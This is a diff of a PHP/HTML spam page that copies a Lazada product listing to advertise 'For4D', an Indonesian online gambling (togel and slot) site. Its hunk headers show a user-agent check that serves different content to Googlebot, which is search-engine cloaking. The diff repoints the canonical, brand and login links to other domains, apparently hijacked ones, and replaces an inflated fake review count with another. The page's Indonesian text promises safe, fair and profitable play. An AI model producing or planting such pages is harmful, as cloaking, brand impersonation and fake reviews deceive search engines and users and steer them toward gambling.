@@ -5,28 +5,30 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 ?>
 
 
+
+
 <!DOCTYPE html>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
     <head>
         <meta charset="utf-8" />
-        <title>For4D The Power Of Situs Toto No1 Indonesia 2025</title>
-        <meta name="google-site-verification" content="y33eIHB55EkMBlPOTNLlmOxOzW-725wFGmJxhGzy-Ro" />
-        <meta name="description" content="For4D merupakan Situs Toto unggulan yang paling di rekomendasikan bagi para pecinta Togel dan Slot Online yang mencari pengalaman bermain terbaik." />
-        <meta name="keywords" content="FOR4D, FOR4D, situs toto, toto slot, toto togel, togel online, slot online" />
+        <title>For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1</title>
+        <meta name="google-site-verification" content="X-pDGbWOS0H37iHZ9FGuFkj8jl-2kEDn8Neq7r7_708" />
+        <meta name="description" content="For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1" />
+        <meta name="keywords" content="FOR4D, sese toto, situs toto, toto togel, toto slot, slot 4d" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
         <meta name="robots" content="index, follow" />
         <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
-        <meta name="og:url" content="https://sciencebring.com/" />
-        <meta name="og:title" content="For4D The Power Of Situs Toto No1 Indonesia 2025" />
+        <meta name="og:url" content="http://www.tangguhku.id/" />
+        <meta name="og:title" content="For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1" />
         <meta name="og:type" content="product" />
-        <meta name="og:description" content="For4D merupakan Situs Toto unggulan yang paling di rekomendasikan bagi para pecinta Togel dan Slot Online yang mencari pengalaman bermain terbaik." />
-        <meta name="og:image" content="https://imgku.io/download/z2lwvVXf.jpg" />
+        <meta name="og:description" content="For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1" />
+        <meta name="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8LXkVG8kafrBfBSszxPF2xP2YLBXS0_T2Iar_M0vXWXixnGNOL2UzSgPuHTLFYcSBfXrYS_p5imaRN57cyAcILb5LZ7d0c7FuFYQWsfqAbjXDFrU6zdDPr3CzVDZde8Ew7XTwrxNcVz-P7NY6U3da2Y5a0tjFCXxgC8ihCzIE_izcMSc4Sowjgoip9LTw/s800/PSD-AESTETIC.jpg" />
         <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json" />
         <link rel="shortcut icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjucP0GYGNKDRTiFMU2xGxJHP8b8d4gMEmP5ZRG-EAVvsFmKidG7Q7pTL1ce0p89g91fM9SOKNHIN4cSJyDkbObIrUXoyZ8PEwm6RoAh_PbKCHQtUUb3Se4eYFsCGVAeeGNUuHS_bHG-RVWEJAMXowJJ6vpyeO5jIyxqRBPIrm86MU9YWdd7_e_bMtC6IPn/s500/ICON_FOR4D-removebg-preview.png" />
-        <link rel="canonical" href="https://sciencebring.com/" />
-        <link rel="amphtml" href="https://douberman.dev/amp/amp-sciencebring.html" />
+        <link rel="canonical" href="https://afroasian-studies.de/" />
+        <link rel="amphtml" href="https://douberman.dev/amp/amp-afroasian.html" />
         <!-- start preload -->
-        <link rel="preload" href="https://imgku.io/download/z2lwvVXf.jpg" as="image" />
+        <link rel="preload" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8LXkVG8kafrBfBSszxPF2xP2YLBXS0_T2Iar_M0vXWXixnGNOL2UzSgPuHTLFYcSBfXrYS_p5imaRN57cyAcILb5LZ7d0c7FuFYQWsfqAbjXDFrU6zdDPr3CzVDZde8Ew7XTwrxNcVz-P7NY6U3da2Y5a0tjFCXxgC8ihCzIE_izcMSc4Sowjgoip9LTw/s800/PSD-AESTETIC.jpg" as="image" />
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
         <link rel="preconnect dns-prefetch" href="//cart.lazada.co.id" />
@@ -132,7 +134,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             var timings = { start: Date.now() };
             var dataLayer = window.dataLayer || [];
             var pdpTrackingData =
-                '{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"https://imgku.io/download/z2lwvVXf.jpg","v_voya":1,"brand_name":"Samsung","brand_id":"842","pdt_sku":3642482616,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":6108584955,"pdt_name":"For4D The Power Of Situs Toto No1 Indonesia 2025","page":{"regCategoryId":"300300002584","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}';
+                '{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8LXkVG8kafrBfBSszxPF2xP2YLBXS0_T2Iar_M0vXWXixnGNOL2UzSgPuHTLFYcSBfXrYS_p5imaRN57cyAcILb5LZ7d0c7FuFYQWsfqAbjXDFrU6zdDPr3CzVDZde8Ew7XTwrxNcVz-P7NY6U3da2Y5a0tjFCXxgC8ihCzIE_izcMSc4Sowjgoip9LTw/s800/PSD-AESTETIC.jpg","v_voya":1,"brand_name":"Samsung","brand_id":"842","pdt_sku":3642482616,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":6108584955,"pdt_name":"For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1","page":{"regCategoryId":"300300002584","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=3642482616_ID-6108584955&_p_prod=3642482616&_p_sku=6108584955&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}';
             try {
                 pdpTrackingData = JSON.parse(pdpTrackingData);
                 pdpTrackingData.v_voya = false;
@@ -180,7 +182,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             #container,
             body {
                 position: relative;
-                background: linear-gradient(90deg, #560000 0%, #ff0000 100%) !important;
+                background: linear-gradient(90deg, #535353 0%, #37738f 100%) !important;
             }
             .background-batiq {
                 position: absolute;
@@ -250,14 +252,14 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 margin-bottom: 1rem;
             }
             .lzd-site-nav-menu.lzd-site-nav-menu-active {
-                background: #980000 !important;
+                background: #000000 !important;
             }
             .logo-bar-content.header-content {
                 display: flex;
                 gap: 1rem;
             }
             .lzd-header-content {
-                background: linear-gradient(90deg, #560000 0%, #ff0000 100%) !important;
+                background: linear-gradient(90deg, #535353 0%, #37738f 100%) !important;
             }
             .lzd-nav-search {
                 margin-left: 4rem;
@@ -289,7 +291,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             }
             .seller-name__detail-name {
                 margin-right: 0;
-                color: #ca1414;
+                color: #000000;
             }
             #pdp-nav {
                 background: unset !important;
@@ -312,7 +314,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             .pdp-mod-product-price h2,
             .pdp-mod-product-price h3,
             .pdp-mod-product-price h4 {
-                color: #d71717;
+                color: #000000;
                 margin-bottom: 0.5rem;
             }
             .pdp-mod-product-price h1 {
@@ -327,7 +329,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                 font-weight: 500;
             }
             .site-description a {
-                color: #d71717;
+                color: #009de6;
                 text-decoration: underline;
             }
             .site-description td {
@@ -380,11 +382,11 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 
         
         @keyframes rainbow {
-            0% { background-color: rgb(255, 234, 0); } /* Merah */
-            16.67% { background-color: rgb(191, 0, 0); } /* Oranye */
-            33.33% { background-color: rgb(233, 0, 0); } /* PINK */
-            50% { background-color: rgb(199, 6, 6); } /* Ungun */
-            100% { background-color: rgb(255, 0, 0); } /* Merah kembali */
+            0% { background-color: rgb(187, 187, 187); } /* Merah */
+            16.67% { background-color: rgb(199, 6, 6); } /* Oranye */
+            33.33% { background-color: rgb(255, 30, 0); } /* PINK */
+            50% { background-color: rgb(255, 0, 0); } /* Ungun */
+            100% { background-color: rgb(224, 5, 5); } /* Merah kembali */
         }
         </style>
 
@@ -875,13 +877,13 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
             {
                 "@type": "Product",
                 "@context": "https://schema.org",
-                "name": "For4D The Power Of Situs Toto No1 Indonesia 2025",
+                "name": "For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1",
                 "image": "//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg",
                 "category": "Televisi & Video",
-                "brand": { "@type": "Brand", "name": "Samsung", "url": "https://sciencebring.com/" },
+                "brand": { "@type": "Brand", "name": "Samsung", "url": "http://www.tangguhku.id/" },
                 "sku": "3642482616_ID-6108584955",
                 "mpn": 3642482616,
-                "description": "For4D merupakan Situs Toto unggulan yang paling di rekomendasikan bagi para pecinta Togel dan Slot Online yang mencari pengalaman bermain terbaik.",
+                "description": "For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1",
                 "url": "https://www.lazada.co.id/products/samsung-t4001-32-inch-digital-led-tv-ua32t4001akxxd-i3642482616-s6108584955.html",
                 "offers": {
                     "@type": "Offer",
@@ -903,7 +905,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "@type": "ListItem",
                         "position": 1,
                         "item": {
-                            "@id": "https://sciencebring.com/",
+                            "@id": "http://www.tangguhku.id/",
                             "name": "FOR4D"
                         }
                     },
@@ -911,7 +913,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "@type": "ListItem",
                         "position": 2,
                         "item": {
-                            "@id": "https://sciencebring.com/",
+                            "@id": "http://www.tangguhku.id/",
                             "name": "Situs Toto"
                         }
                     },
@@ -919,7 +921,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "@type": "ListItem",
                         "position": 3,
                         "item": {
-                            "@id": "https://sciencebring.com/",
+                            "@id": "http://www.tangguhku.id/",
                             "name": "Toto Togel"
                         }
                     },
@@ -927,7 +929,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "@type": "ListItem",
                         "position": 4,
                         "item": {
-                            "@id": "https://sciencebring.com/",
+                            "@id": "http://www.tangguhku.id/",
                             "name": "Toto Slot"
                         }
                     },
@@ -935,8 +937,8 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         "@type": "ListItem",
                         "position": 5,
                         "item": {
-                            "@id": "https://sciencebring.com/",
-                            "name": "For4D The Power Of Situs Toto No1 Indonesia 2025"
+                            "@id": "http://www.tangguhku.id/",
+                            "name": "For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1"
                         }
                     }
                 ]
@@ -1047,10 +1049,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         <a class="highlight" target="_blank" href="https://yida.alibaba-inc.com/alibaba/web/APP_NZEYXSPGPBMKO7Z1LCE5/inst/homepage/?spm=a2o42.home.header.d0.654346b5QeptXc#/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d0">INTERNAL FEEDBACK</a>
                                     </div>
                                     <div class="top-links-item" id="topActionFeedback">
-                                        <a target="_blank" href="https://sciencebring.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback">FOR4D</a>
+                                        <a target="_blank" href="https://afroasian-studies.de/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback">FOR4D</a>
                                     </div>
                                     <div class="top-links-item orange" id="topActionDownload" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d1">
-                                        <span><a href="https://sciencebring.com/">Situs Toto Slot</a></span>
+                                        <span><a href="https://afroasian-studies.de/">Situs Toto Slot</a></span>
                                         <div class="lzd-download-popup top-popup-wrap" id="lzdDownloadPopup">
                                             <div class="top-popup-content lzd-download-content">
                                                 <div class="get-the-app-scope">
@@ -1072,10 +1074,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                                     <div class="get-the-app-download-text">
                                                                         <p>FOR4D:</p>
                                                                         <ul>
-                                                                            <li>Situs Togel</li>
+                                                                            <li>Situs Toto</li>
                                                                             <li>Link Toto</li>
-                                                                            <li>Togel Online</li>
-                                                                            <li>Slot Online</li>
+                                                                            <li>Slot 4D</li>
+                                                                            <li>Toto Slot</li>
                                                                         </ul>
                                                                     </div>
                                                                 </a>
@@ -1105,10 +1107,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         </div>
                                     </div>
                                     <div class="top-links-item" id="topActionSell">
-                                        <a class="black" href="https://sciencebring.com/">Situs Toto Togel</a>
+                                        <a class="black" href="https://afroasian-studies.de/">Situs Toto Togel</a>
                                     </div>
                                     <div class="top-links-item" id="topActionCustomCare" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d3">
-                                        <span><a href="https://sciencebring.com/">Situs Slot Online</a></span>
+                                        <span><a href="https://afroasian-studies.de/">Bandar Toto Online</a></span>
                                         <div class="lzd-customcare-popup top-popup-wrap">
                                             <div class="top-popup-content l-customcare-content">
                                                 <ul class="care-list">
@@ -1155,11 +1157,11 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         </div>
                                     </div>
                                     <div class="top-links-item" id="topActionTrack" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d4">
-                                        <span><a href="https://sciencebring.com/">Situs Togel Online</a></span>
+                                        <span><a href="https://afroasian-studies.de/">Aplikasi Toto 4D</a></span>
                                         <div class="lzd-track-popup top-popup-wrap" id="lzdTrackPop">
                                             <div class="top-popup-content lzd-track-content">
                                                 <div id="topActionMyLastOrder"></div>
-                                                <div class="track-title">For4D The Power Of Situs Toto No1 Indonesia 2025</div>
+                                                <div class="track-title">For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1</div>
                                                 <form class="track-order-form" id="topActionTrackForm">
                                                     <label for="topActionTrackOrderNumber" class="top-input-label">Nomor pesanan:</label>
                                                     <div class="top-input-wrap track-order-input-wrap">
@@ -1177,10 +1179,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         </div>
                                     </div>
                                     <div class="top-links-item" id="anonLogin">
-                                        <a href="https://douberman.dev/amp/amp-sciencebring.html" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5" style="color: #001174;">LOGIN</a>
+                                        <a href="https://douberman.dev/amp/amp-afroasian.html" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d5" style="color: #001174;">LOGIN</a>
                                     </div>
                                     <div class="top-links-item grey" id="anonSignup">
-                                        <a href="https://douberman.dev/amp/amp-sciencebring.html" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6" style="color: #001174;">DAFTAR</a>
+                                        <a href="https://douberman.dev/amp/amp-afroasian.html" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d6" style="color: #001174;">DAFTAR</a>
                                     </div>
                                     <div class="top-links-item top-links-item-hidden" id="topActionUserAccont" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d7">
                                         <span id="myAccountTrigger" class="grey"></span>
@@ -1214,7 +1216,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                             <div class="lzd-logo-bar">
                                 <div class="logo-bar-content header-content">
                                     <div class="lzd-logo-content">
-                                        <a href="https://sciencebring.com/" data-spm="dhome">
+                                        <a href="https://afroasian-studies.de/" data-spm="dhome">
                                             <img
                                                 src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgost24-ZoZEx2EUUijXoG5h9lSxbEyn6zbKfDkSW4dNOy34fdwHZhCkZpc1PO896h43E0GAHOJ6XjmSwcpMwfsM60kDGRTvhOHwhbboepsko_WiSR_873fplXfnThxO4Cld156nIml80wWaLO5pCOwvlZIepyWELfeylz41ddiIzlDwOucFZErIOEuL3Co/s300/for4d.gif"
                                                 alt="FOR4D"
@@ -1237,7 +1239,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
                                                 <div class="lzd-site-menu-nav-container">
                                                     <div class="lzd-site-menu-nav-category">
-                                                        <a href="https://sciencebring.com/">
+                                                        <a href="https://afroasian-studies.de/">
                                                             <span class="lzd-site-menu-nav-category-text">Kategori</span>
                                                         </a>
                                                         <div class="lzd-site-menu-nav-menu">
@@ -2340,7 +2342,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                             <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
                                 <div class="lzd-site-menu-nav-container">
                                     <div class="lzd-site-menu-nav-category">
-                                        <a href="https://sciencebring.com/">
+                                        <a href="https://afroasian-studies.de/">
                                             <span class="lzd-site-menu-nav-category-text">Kategori</span>
                                         </a>
                                         <div class="lzd-site-menu-nav-menu">
@@ -3375,10 +3377,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         </div>
                                     </div>
                                     <nav class="lzd-menu-labels" data-spm="menu">
-                                        <a
-                                            class="lzd-menu-labels-item"
-                                            href="https://sciencebring.com/"
-                                        >
+                                        <a class="lzd-menu-labels-item" href="https://afroasian-studies.de/">
                                             <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                                                 <img
                                                     alt="Link Toto"
@@ -3389,7 +3388,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-LazMall">&#xe629;</i>-->
                                             <span class="lzd-menu-labels-item-text">Link Toto</span>
                                         </a>
-                                        <a class="lzd-menu-labels-item" href="https://sciencebring.com/">
+                                        <a class="lzd-menu-labels-item" href="https://afroasian-studies.de/">
                                             <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                                                 <img
                                                     alt="Situs Toto"
@@ -3400,7 +3399,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-MobileTop1">&#xe768;</i>-->
                                             <span class="lzd-menu-labels-item-text">Situs Toto</span>
                                         </a>
-                                        <a class="lzd-menu-labels-item" href="https://sciencebring.com/">
+                                        <a class="lzd-menu-labels-item" href="https://afroasian-studies.de/">
                                             <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                                                 <img
                                                     alt="Toto Slot"
@@ -3411,7 +3410,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                             <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-Vouchers">&#xe76a;</i>-->
                                             <span class="lzd-menu-labels-item-text">Toto Slot</span>
                                         </a>
-                                        <a class="lzd-menu-labels-item" href="https://sciencebring.com/">
+                                        <a class="lzd-menu-labels-item" href="https://afroasian-studies.de/">
                                             <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                                                 <img
                                                     alt="Toto Togel"
@@ -3560,7 +3559,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                             .breadcrumb_list .breadcrumb .breadcrumb_item .breadcrumb_item_text .breadcrumb_item_anchor {
                                 display: inline-block;
                                 vertical-align: middle;
-                                color: #da2727;
+                                color: #DAA727;
                                 padding: 0 4px;
                                 font-size: 14px;
                                 font-family: Roboto-Regular, Helvetica, Arial, sans-serif;
@@ -3663,14 +3662,14 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 <div class="gallery-preview-panel">
                                     <div class="gallery-preview-panel__content">
                                         <img
-                                            class="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLCFGW6hwiAcjtCI9DkV3G7mAdGns2a2QZGdWIr_PILaJlx_qUdqHn-NdVYv2UUfNl93V1o1lZM0qxr3ia-FGJ-Zm08lnuEFIUbOnnbEPu20to0ErVOV8UmgYPkMEWvb2PicQa4Gtvfxylc6FPbskHxesL9pmR1VUNZMpsUNhCTBqmkUaErB3PEcMS-DIA/s800/background.jpg"
+                                            class="pdp-mod-common-image gallery-preview-panel__image"
                                             alt="FOR4D"
-                                            src="https://imgku.io/download/z2lwvVXf.jpg"
+                                            src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8LXkVG8kafrBfBSszxPF2xP2YLBXS0_T2Iar_M0vXWXixnGNOL2UzSgPuHTLFYcSBfXrYS_p5imaRN57cyAcILb5LZ7d0c7FuFYQWsfqAbjXDFrU6zdDPr3CzVDZde8Ew7XTwrxNcVz-P7NY6U3da2Y5a0tjFCXxgC8ihCzIE_izcMSc4Sowjgoip9LTw/s800/PSD-AESTETIC.jpg"
                                         />
                                     </div>
                                     <p style="text-align: center;">
-                                        <a href="https://douberman.dev/amp/amp-sciencebring.html">
-                                            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSaS7UzhSXDxVr0_0Rl4GZCS5UV88xn1nsk-bl-2RC8uk13jZ5b8BY7vbBvTPB3Tgbp9n8r5_q0inMyeWvOwrKL5MDmw2kDMpmNZ96fAbcJXUBZmKIbY8SyC9T4bxfTw_0XVp37QFqCvMPRYeIcbduHeHDiVzVxFwcQeJ_A8RMPVNB0RJvkMXASEpvFhxo/s407/daftar.webp" alt="situs toto" style="width: 320px; height: 105px;">
+                                        <a href="https://douberman.dev/amp/amp-afroasian.html">
+                                            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFv0_6QFMfw4S5O7qabYMhZfsqMr_gLj2j0NwBzN42UR35TTjWSncqyTiNdwWBO6yQIlBg-cbSNqUTRQQApiPm5W9slrSl0Tt0NTC1YZpBQKN61irwHNrN1CzIeFC-7WqqW_3tdfrnDlPiVimYznF513fcjaLPW8VrD5ewZe49k8GYRISY-dgO9WZco9mg/s320/slotgacor.gif" alt="situs toto" style="width: 320px; height: 105px;">
                                         </a>
                                     </p>
                                 </div>
@@ -3687,7 +3686,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         <div id="module_redmart_top_promo_banner" class="pdp-block module"></div>
                                         <div id="module_product_title_1" class="pdp-block module">
                                             <div class="pdp-product-title">
-                                                <div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">For4D The Power Of Situs Toto No1 Indonesia 2025</h1></div>
+                                                <div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1</h1></div>
                                             </div>
                                         </div>
                                         <div id="module_pre-order-tag" class="pdp-block module"></div>
@@ -3702,7 +3701,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                             <img class="star" src="https://cdn.lazadapro.co/lazada/i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" />
                                                             <img class="star" src="https://cdn.lazadapro.co/lazada/i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" />
                                                         </div>
-                                                        <a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">99.4541.485 Penilaian</a>
+                                                        <a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">18.978.123 Penilaian</a>
                                                     </div>
                                                 </div>
                                             </div>
@@ -3716,15 +3715,15 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                         <div id="module_product_brand_1" class="pdp-block module">
                                             <div class="pdp-product-brand">
                                                 <span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span>
-                                                <a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://sciencebring.com/">FOR4D</a>
+                                                <a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://afroasian-studies.de/">FOR4D</a>
                                                 <!-- <div class="pdp-product-brand__divider"></div> -->
                                                 <div class="pdp-cart-concern" bis_skin_checked="1">
-                                                    <a href="https://douberman.dev/amp/amp-sciencebring.html">
+                                                    <a href="https://douberman.dev/amp/amp-afroasian.html">
                                                         <button class="add-to-cart-buy-now-btn pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j">
                                                             <span class="pdp-button-text">LOGIN</span>
                                                         </button>
                                                     </a>
-                                                    <a href="https://douberman.dev/amp/amp-sciencebring.html" target="_blank">
+                                                    <a href="https://douberman.dev/amp/amp-afroasian.html" target="_blank">
                                                         <button class="add-to-cart-buy-now-btn pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl">
                                                             <span class="pdp-button-text"><span class="">DAFTAR</span></span>
                                                         </button>
@@ -3747,7 +3746,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                                 <div class="seller-container" data-spm="seller">
                                                     <div class="seller-name">
                                                         <div class="seller-name__wrapper">
-                                                            <div class="seller-name__title">Dijual oleh <a href="https://sciencebring.com/" style="color: #000000">FOR4D</a></div>
+                                                            <div class="seller-name__title">Dijual oleh <a href="https://afroasian-studies.de/" style="color: #00a5c2">FOR4D</a></div>
                                                             <div class="seller-name__detail" data-spm="seller">
                                                             </div>
                                                         </div>
@@ -3762,11 +3761,11 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                                 <div id="module_product_price_1" class="pdp-block module">
                                     <div class="pdp-mod-product-price">
                                         <div class="site-description">
-                                            <h1 class="w-80">For4D The Power Of Situs Toto No1 Indonesia 2025</h1>
-                                            <p>For4D merupakan <a href="https://sciencebring.com/"><strong>Situs Toto</strong></a> unggulan yang paling di rekomendasikan bagi para pecinta Togel dan Slot Online yang mencari pengalaman bermain terbaik. Dengan sistem modern dan aman, For4D menawarkan berbagai pilihan permainan menarik, mulai dari Togel dengan 95 Pasaran resmi, hingga Slot Game dengan Jackpot Fantastis. Diduking oleh teknologi terbaru, platform ini menjamin kenyamanan dan keamanan bagi setiap pemain dalam bertransaksi maupun menikmati permainan.</p>
-<p data-spm-anchor-id="0.0.0.i0.73aa2c5e0Hb87T">Sebagai <a href="https://sciencebring.com/"><strong>Situs Toto</strong></a> terpercaya, For4D menyediakan akses mudah dengan proses login yang cepat dan sistem fair-play yang transparan. Berbagai Pasaran Togel resmi, seperti Toto Macau, Singapore, Hongkong, dan Sydney, tersedia setiap hari dengan hasil yang dapat di cek secara rel-time lewat fitur livedraw yang telah disediakan. Selain itu, For4D juga memiliki koleksi permainan Slot berkualitas tinggi dengan tingkat kemenangan yang kompetitif, memberikan peluang lebih besar bagi para pemain untuk meraih keuntungan.</p>
-<p>Keunggulan lain dari For4D adalah layanan pelanggan profesional dan responsif yang siap membantu selama 24jam, memastikan setiap pemain mendapatkan pengalaman bermain yang nyaman. Metode transaksi yang cepat, aman, dan lengkap baik melalui bank lokal maupun e-wallet, semakin mempermudah pengguna dalam melakukan deposit dan penarikan dana. Dengan segala kelebihannya, For4D menjadi pilihan terbaik bagi para pecinta <a href="https://sciencebring.com/"><strong>Toto</strong> </a>dan Slot Online yang menginginkan keseruan dan keuntungan dalam satu platform resmi terpercaya.</p>
-                                            <a href="https://douberman.dev/amp/amp-sciencebring.html" target="_blank" rel="noreferrer noopener">
+                                            <h1 class="w-80">For4D : Situs Toto 4D & Login Bandar Slot Resmi Terbaik No.1</h1>
+                                            <p>For4D kini hadir sebagai <a href="https://afroasian-studies.de/">Situs Toto</a> unggul, bagi para pecinta Togel dan Slot Online yang sedang mencari pengalaman bermain terbaik. Dengan sisten yang modern dan aman, For4D menawarkan berbagai pilihan permainan menarik, mulai dari permainan Togel dengan pasaran resmi hingga Slot Game dengan Jackpot Maxwin. Didukung oleh teknologi terbaru, platform ini menjaminkan kenyamanan dan keamanan bagi para pemain dalam bertransaksi hingga menikmati permainan.</p>
+<p>Sebagai bandar Togel terpercaya, For4D menyediakan akses mudah dengan proses login tercepat dan sistem fair-play yang transparan. Berbagai pasaran togel resmi, seperti Singapore, Toto Macau, Hongkong, dan Sydney, tersedia setiap hari dengan hasil yang dapat di cek secara real-time lewat fitur livedraw yang di sediakan. Selain itu, For4D juga memiliki koleksi permainan Slot berkualitas tinggi dengan tingkat kemenangan yang kompetitif, memberikan peluang lebih besar bagi para pemain untuk meraih keuntungan.</p>
